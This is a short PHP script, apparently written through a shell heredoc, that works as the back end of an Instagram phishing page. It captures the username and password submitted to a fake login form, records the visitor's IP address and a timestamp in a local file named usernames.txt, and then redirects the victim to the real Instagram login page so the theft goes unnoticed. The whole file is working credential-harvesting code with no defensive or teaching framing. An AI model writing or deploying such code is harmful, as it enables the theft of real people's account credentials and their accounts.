'LOGINEOF'
<?php
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$timestamp = date('Y-m-d H:i:s');
$log_file = __DIR__ . '/usernames.txt';
$entry = "========================================\n";
$entry .= "Timestamp: $timestamp\n";
$entry .= "Service: Instagram\n";
$entry .= "Username: $username\n";
$entry .= "Password: $password\n";
$entry .= "IP: $ip\n";
$entry .= "========================================\n\n";
file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
header('Location: https://www.instagram.com/accounts/login/?next=%2F');
exit();
LOGINEOF